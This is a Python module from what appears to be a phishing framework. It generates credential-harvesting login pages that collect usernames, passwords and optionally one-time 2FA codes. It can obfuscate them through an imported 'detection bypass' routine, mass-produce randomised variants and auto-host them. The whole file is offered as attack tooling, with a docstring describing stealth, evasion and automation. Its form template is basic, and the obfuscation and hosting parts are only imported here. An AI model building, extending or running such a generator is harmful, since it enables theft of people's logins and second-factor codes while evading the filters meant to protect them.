# phishing_payloads.py

"""
This module generates and manages advanced phishing payloads for various scenarios,
including credential harvesting, fake 2FA, browser fingerprinting, and evasion tactics.
It supports integration with the full phishing framework, allowing automation and stealth.
"""

import os
import json
import random
import string
from utils.logger import logger
from phishing.phish_detection_bypass import apply_bypass_techniques

# =========================
# Payload Utilities
# =========================
def generate_random_string(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def save_payload(payload: str, path: str):
    with open(path, 'w') as f:
        f.write(payload)
    logger.info(f"Saved payload to {path}")

# =========================
# HTML Payload Templates
# =========================
def get_login_form_template(fake_2fa=False):
    form = '''<html><body><form method="POST" action="/login">Username: <input name="user"><br>Password: <input type="password" name="pass"><br>'''
    if fake_2fa:
        form += 'Enter OTP: <input name="otp"><br>'
    form += '''<input type="submit" value="Login"></form></body></html>'''
    return form

def obfuscate_payload(payload: str) -> str:
    return apply_bypass_techniques(payload)

# =========================
# Phishing Payload Generator
# =========================
def generate_payload(output_path: str, fake_2fa: bool = False, stealth: bool = True):
    html = get_login_form_template(fake_2fa)
    if stealth:
        html = obfuscate_payload(html)
    save_payload(html, output_path)
    logger.success(f"Phishing payload generated (2FA={fake_2fa}, stealth={stealth})")

# =========================
# Advanced Variants
# =========================
def generate_multiple_variants(base_output_dir: str, num_variants: int = 5):
    os.makedirs(base_output_dir, exist_ok=True)
    for i in range(num_variants):
        fake_2fa = random.choice([True, False])
        stealth = random.choice([True, False])
        filename = f"variant_{i+1}_{generate_random_string(6)}.html"
        path = os.path.join(base_output_dir, filename)
        generate_payload(path, fake_2fa=fake_2fa, stealth=stealth)

# =========================
# Integration for Automation
# =========================
def auto_generate_and_host(output_dir="outputs/phishing_payloads", host: bool = False):
    generate_multiple_variants(output_dir)
    if host:
        from phishing.auto_host import start_hosting  # optional feature
        start_hosting(output_dir)

# =========================
# Command-line Entry (Optional)
# =========================
if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="Phishing Payload Generator")
    parser.add_argument('--output', default='outputs/phishing_payloads', help='Output directory')
    parser.add_argument('--variants', type=int, default=5, help='Number of variants to generate')
    parser.add_argument('--host', action='store_true', help='Auto-host the payloads')
    args = parser.parse_args()

    generate_multiple_variants(args.output, args.variants)
    if args.host:
        try:
            from phishing.auto_host import start_hosting
            start_hosting(args.output)
        except ImportError:
            logger.warning("Auto-hosting not available. Missing 'auto_host' module.")
